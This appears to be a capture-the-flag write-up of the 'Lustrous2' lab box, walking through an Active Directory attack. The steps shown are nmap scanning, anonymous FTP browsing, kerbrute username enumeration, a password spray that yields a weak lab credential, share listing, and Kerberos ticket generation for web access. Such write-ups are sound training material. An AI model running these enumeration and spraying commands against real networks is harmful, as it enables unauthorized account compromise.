# Host file setup
```python
sudo nxc smb 10.129.242.166 --generate-hosts-file /etc/hosts               
[sudo] password for kali: 
SMB         10.129.242.166  445    LUS2DC           [*]  x64 (name:LUS2DC) (domain:Lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
```

NTLM auth is disabled, which means ill have to work with kerberos

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT lus2dc.lustrous2.vl                                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 16:15 +0100
Nmap scan report for lus2dc.lustrous2.vl (10.129.242.166)
Host is up (0.013s latency).
rDNS record for 10.129.242.166: LUS2DC.Lustrous2.vl
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49779/tcp open  unknown
60285/tcp open  unknown
60287/tcp open  unknown
60304/tcp open  unknown
61989/tcp open  unknown
61990/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.29 seconds
```

## Nmap
```python
nmap -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT lus2dc.lustrous2.vl
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 16:18 +0100
Nmap scan report for lus2dc.lustrous2.vl (10.129.242.166)
Host is up (0.013s latency).
rDNS record for 10.129.242.166: LUS2DC.Lustrous2.vl

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-06-24  05:20AM       <DIR>          Development
| 04-14-25  04:44AM       <DIR>          Homes
| 08-31-24  01:57AM       <DIR>          HR
| 08-31-24  01:57AM       <DIR>          IT
| 04-14-25  04:44AM       <DIR>          ITSEC
| 08-31-24  01:58AM       <DIR>          Production
|_08-31-24  01:58AM       <DIR>          SEC
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Negotiate
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 15:18:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-12T15:19:39+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Not valid before: 2026-08-11T15:12:47
|_Not valid after:  2027-02-10T15:12:47
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: LUS2DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# FTP (21)

```python
ftp> cd ../ITSEC
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50755|)
150 Opening ASCII mode data connection.
09-07-24  03:50AM                  207 audit_draft.txt
226 Transfer complete.
ftp> get audit_draft.txt
local: audit_draft.txt remote: audit_draft.txt
229 Entering Extended Passive Mode (|||50757|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************************|   207       15.42 KiB/s    00:00 ETA
226 Transfer complete.
207 bytes received in 00:00 (15.29 KiB/s)
```

Anonymous login is allowed, ill download any interesting files i find

```python
cat htb/LustrousTwo/audit_draft.txt 
Audit Report Issue Tracking

[Fixed] NTLM Authentication Allowed
[Fixed] Signing & Channel Binding Not Enabled
[Fixed] Kerberoastable Accounts
[Fixed] SeImpersonate Enabled

[Open] Weak User Passwords 
```

There may still be some weak user passwords here

```python
ftp> cd ../Homes
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50763|)
125 Data connection already open; Transfer starting.
09-07-24  12:03AM       <DIR>          Aaron.Norman
09-07-24  12:03AM       <DIR>          Adam.Barnes
09-07-24  12:03AM       <DIR>          Amber.Ward
09-07-24  12:03AM       <DIR>          Andrea.Smith
09-07-24  12:03AM       <DIR>          Ann.Lynch
09-07-24  12:03AM       <DIR>          Callum.Oliver
09-07-24  12:03AM       <DIR>          Carly.Walker
09-07-24  12:03AM       <DIR>          Chelsea.Smith
09-07-24  12:03AM       <DIR>          Chloe.Hammond
09-07-24  12:03AM       <DIR>          Christopher.Lawson
09-07-24  12:03AM       <DIR>          Claire.Parry
09-07-24  12:03AM       <DIR>          Darren.Lewis
09-07-24  12:03AM       <DIR>          Deborah.Jones
09-07-24  12:03AM       <DIR>          Dominic.West
09-07-24  12:03AM       <DIR>          Duncan.Smith
09-07-24  12:03AM       <DIR>          Elaine.Gallagher
09-07-24  12:03AM       <DIR>          Eleanor.Gregory
09-07-24  12:03AM       <DIR>          Emma.Bell
09-07-24  12:03AM       <DIR>          Francesca.Norman
09-07-24  12:03AM       <DIR>          Gary.Richards
09-07-24  12:03AM       <DIR>          Gerard.Ward
09-07-24  12:03AM       <DIR>          Glenn.Williams
09-07-24  12:03AM       <DIR>          Graeme.Pritchard
09-07-24  12:03AM       <DIR>          Harriet.Richardson
09-07-24  12:03AM       <DIR>          Henry.Connor
09-07-24  12:03AM       <DIR>          Howard.Robinson
09-07-24  12:03AM       <DIR>          Jacqueline.Phillips
09-07-24  12:03AM       <DIR>          Janice.Collier
09-07-24  12:03AM       <DIR>          Jasmine.Johnson
09-07-24  12:03AM       <DIR>          Joan.Wall
09-07-24  12:03AM       <DIR>          Judith.Francis
09-07-24  12:03AM       <DIR>          Justin.Williams
09-07-24  12:03AM       <DIR>          Kyle.Hussain
09-07-24  12:03AM       <DIR>          Kyle.Lloyd
09-07-24  12:03AM       <DIR>          Lawrence.Bryan
09-07-24  12:03AM       <DIR>          Leah.Elliott
09-07-24  12:03AM       <DIR>          Lewis.Khan
09-07-24  12:03AM       <DIR>          Liam.Wheeler
09-07-24  12:03AM       <DIR>          Lisa.Begum
09-07-24  12:03AM       <DIR>          Louis.Phillips
09-07-24  12:03AM       <DIR>          Lydia.Parker
09-07-24  12:03AM       <DIR>          Malcolm.Yates
09-07-24  12:03AM       <DIR>          Marie.Hill
09-07-24  12:03AM       <DIR>          Martin.Hamilton
09-07-24  12:03AM       <DIR>          Mathew.Roberts
09-07-24  12:03AM       <DIR>          Melissa.Thompson
09-07-24  12:03AM       <DIR>          Nathan.Carter
09-07-24  12:03AM       <DIR>          Nicola.Clarke
09-07-24  12:03AM       <DIR>          Nicola.Hall
09-07-24  12:03AM       <DIR>          Nigel.Lee
09-07-24  12:03AM       <DIR>          Pamela.Taylor
09-07-24  12:03AM       <DIR>          Robert.Russell
09-07-24  12:03AM       <DIR>          Ryan.Davies
09-07-24  12:03AM       <DIR>          Ryan.Moore
09-07-24  12:03AM       <DIR>          Ryan.Rowe
09-07-24  12:03AM       <DIR>          Samantha.Smith
09-07-24  12:03AM       <DIR>          Sara.Matthews
09-07-24  12:03AM       <DIR>          ShareSvc
09-07-24  12:03AM       <DIR>          Sharon.Birch
09-07-24  12:03AM       <DIR>          Sharon.Evans
09-07-24  12:03AM       <DIR>          Stacey.Barber
09-07-24  12:03AM       <DIR>          Stacey.Griffiths
09-07-24  12:03AM       <DIR>          Stephanie.Baxter
09-07-24  12:03AM       <DIR>          Stephanie.Davies
09-07-24  12:03AM       <DIR>          Steven.Sutton
09-07-24  12:03AM       <DIR>          Susan.Johnson
09-07-24  12:03AM       <DIR>          Terence.Jordan
09-07-24  12:03AM       <DIR>          Thomas.Myers
09-07-24  12:03AM       <DIR>          Tony.Davies
09-07-24  12:03AM       <DIR>          Victoria.Williams
09-07-24  12:03AM       <DIR>          Wayne.Taylor
226 Transfer complete.
ftp>
```

Also found a long list of names, they look like users due to the `sharesvc` account

So my plan is to put these users into a userlist, then use kerbrute and see which ones are valid

## Finding valid users

```python
kerbrute userenum --dc lus2dc.lustrous2.vl -d lustrous2.vl users.txt -v

...[SNIP]...

2026/08/12 16:51:52 >  [+] VALID USERNAME:	ann.lynch@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	amber.ward@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	callum.oliver@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	andrea.smith@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	adam.barnes@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	chelsea.smith@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	christopher.lawson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	aaron.norman@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	chloe.hammond@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	carly.walker@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	darren.lewis@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	duncan.smith@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	elaine.gallagher@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	deborah.jones@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	claire.parry@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	francesca.norman@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	dominic.west@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	gary.richards@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	eleanor.gregory@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	emma.bell@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	henry.connor@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	harriet.richardson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	glenn.williams@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	jacqueline.phillips@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	gerard.ward@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	howard.robinson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	graeme.pritchard@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	jasmine.johnson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	janice.collier@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	joan.wall@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	judith.francis@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	lawrence.bryan@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	liam.wheeler@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	kyle.lloyd@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	kyle.hussain@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	justin.williams@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	louis.phillips@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	lisa.begum@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	lewis.khan@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	leah.elliott@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	lydia.parker@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	malcolm.yates@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	martin.hamilton@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	mathew.roberts@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	marie.hill@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	melissa.thompson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	nigel.lee@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	nicola.hall@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	nathan.carter@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	nicola.clarke@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	robert.russell@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	ryan.davies@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	pamela.taylor@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	ryan.moore@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	ryan.rowe@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	sharon.birch@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	sharesvc@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	sara.matthews@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	samantha.smith@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	sharon.evans@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	stacey.griffiths@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	stephanie.baxter@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	stephanie.davies@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	stacey.barber@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	susan.johnson@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	steven.sutton@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	terence.jordan@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	victoria.williams@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	thomas.myers@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	tony.davies@lustrous2.vl
2026/08/12 16:51:52 >  [+] VALID USERNAME:	wayne.taylor@lustrous2.vl
2026/08/12 16:51:52 >  Done! Tested 71 usernames (71 valid) in 0.111 seconds
```

So looks like they are all valid.

# Weak password leads to user compromise

Going off the hint of weak passwords ill try ones relating to this box and maybe a year

```python
nxc smb lus2dc.lustrous2.vl -u users.txt -p 'Lustrous2024' -k --continue-on-success

...[SNIP]...

SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\thomas.myers:Lustrous2024
```

After trying several different combinations, i get a valid logon!

# Enumeration of `thomas.myers`

```python
nxc smb lus2dc.lustrous2.vl -u thomas.myers -p 'Lustrous2024' -k --shares                                     
SMB         lus2dc.lustrous2.vl 445    lus2dc           [*]  x64 (name:lus2dc) (domain:lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\thomas.myers:Lustrous2024 
SMB         lus2dc.lustrous2.vl 445    lus2dc           [*] Enumerated shares
SMB         lus2dc.lustrous2.vl 445    lus2dc           Share           Permissions     Remark
SMB         lus2dc.lustrous2.vl 445    lus2dc           -----           -----------     ------
SMB         lus2dc.lustrous2.vl 445    lus2dc           ADMIN$                          Remote Admin
SMB         lus2dc.lustrous2.vl 445    lus2dc           C$                              Default share
SMB         lus2dc.lustrous2.vl 445    lus2dc           IPC$            READ            Remote IPC
SMB         lus2dc.lustrous2.vl 445    lus2dc           NETLOGON        READ            Logon server share 
SMB         lus2dc.lustrous2.vl 445    lus2dc           SYSVOL          READ            Logon server share
```

Just read permissions on default shares

There is a kerberoastable account, but the hashing algorithm is AES256 which means its likely not going to crack!

# Access to the web service

So my thinking is the web site is throwing a 401 error since its using kerberos to authenticate

So if i generate a ticket and export it, i should then be able to authenticate

```python
nxc smb lus2dc.lustrous2.vl -u thomas.myers -p 'Lustrous2024' -k --generate-tgt thomasmyers
SMB         lus2dc.lustrous2.vl 445    lus2dc           [*]  x64 (name:lus2dc) (domain:lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\thomas.myers:Lustrous2024 
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] TGT saved to: thomasmyers.ccache
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] Run the following command to use the TGT: export KRB5CCNAME=thomasmyers.ccache
```

First ill get the TGT

```python
export KRB5CCNAME=thomasmyers.ccache
```

Then ill export it

```python
curl -I --negotiate -u : http://lus2dc.lustrous2.vl                                      
HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate oXsweaADCgEBoQsGCSqGSIb3EgECAqJlBGNgYQYJKoZIhvcSAQICAwB+UjBQoAMCAQWhAwIBHqQRGA8yMDI2MDgxMjE2MjAxOFqlBQIDB2japgMCASmpDhsMTFVTVFJPVVMyLlZMqhUwE6ADAgEBoQwwChsIU2hhcmVTdmM=
X-Powered-By: ASP.NET
Date: Wed, 12 Aug 2026 16:20:18 GMT
```

`-I`  will send a HEAD request to see if the connection is successful
`--negotiate`  will tell it to use the kerberos ticket
`-u` will set null credentials, since im using a kerberos ticket